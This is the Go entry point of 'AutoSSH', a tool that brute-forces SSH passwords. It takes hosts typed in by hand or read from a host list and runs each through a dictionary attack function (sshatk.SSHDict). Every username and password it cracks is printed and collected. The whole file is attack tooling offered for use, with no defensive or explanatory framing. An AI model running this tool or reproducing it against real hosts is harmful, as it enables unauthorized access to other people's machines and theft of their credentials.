package main

import (
	"bufio"
	"fmt"
	"log"
	"math"
	"os"

	"github.com/cfschilham/autossh/internal/loadcfg"
	"github.com/cfschilham/autossh/internal/sshatk"
)

func main() {
	fmt.Println("AutoSSH v1.1.2 - https://github.com/cfschilham/autossh")

	fmt.Println("Loading cfg/config.yml...")
	config, err := loadcfg.LoadConfig()
	if err != nil {
		log.Fatalln(err.Error())
	}

	fmt.Printf("Loading %s...\n", config.DictPath())
	dict, err := loadcfg.LoadDict(config.DictPath())
	if err != nil {
		log.Fatalln(err.Error())
	}

	switch config.Mode() {
	case "manual":
		if config.UsrIsHost() {
			fmt.Println("You currently have 'user_is_host' enabled in cfg/config.yml. This means an input of, for example, 'pcname' will be inferred as 'pcname@pcname.local'")
		} else {
			fmt.Println("Example input: 'john@johns-pc.local', 'peter@192.168.1.2'")
		}

		for {
			fmt.Print("Enter host (type 'exit' to exit): ")
			sc := bufio.NewScanner(os.Stdin)
			sc.Scan()
			input := sc.Text()
			if sc.Err() != nil {
				log.Println(sc.Err())
				continue
			}

			if input == "exit" {
				os.Exit(0)
			}

			// Use user input to create a new Host struct
			host, err := loadcfg.StrToHost(input, config.UsrIsHost())
			if err != nil {
				log.Println(err.Error())
				continue
			}

			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
			pwd, err := sshatk.SSHDict(host, config, dict)
			if err != nil {
				log.Println(err.Error())
				continue
			}
			fmt.Printf("Password of '%s' found: %s\n", host.Username()+"@"+host.IP(), pwd)
		}

	case "hostlist":
		fmt.Printf("Loading %s...\n", config.HostlistPath())
		hSlc, err := loadcfg.LoadHostlist(config.HostlistPath(), config.UsrIsHost())
		if err != nil {
			log.Fatalln(err.Error())
		}

		// Loop through host list and append found username, hostname and password-combinations to a map
		var hostPwdCombos = map[string]string{}
		for i, host := range hSlc {
			fmt.Printf("%d%% done\n", int(math.Round(float64(i)/float64(len(hSlc))*100)))
			fmt.Printf("Attempting to connect to '%s@%s'...\n", host.Username(), host.IP())
			pwd, err := sshatk.SSHDict(host, config, dict)
			if err != nil {
				log.Println(err.Error())
				continue
			}
			fmt.Printf("Password of '%s' found: '%s'\n", host.Username()+"@"+host.IP(), pwd)
			hostPwdCombos[host.IP()] = pwd
		}

		// Print all found combinations
		if len(hostPwdCombos) > 0 {
			fmt.Println("The following combinations were found: ")
			for host, pwd := range hostPwdCombos {
				fmt.Printf("Host: '%s' | Password: '%s'\n", host, pwd)
			}
		} else {
			fmt.Println("No combinations were found")
		}

		fmt.Println("Press enter to exit...")
		fmt.Scanln()

	default:
		log.Fatalf("cfg/config.yml: '%s' is not a valid mode", config.Mode())
	}
}
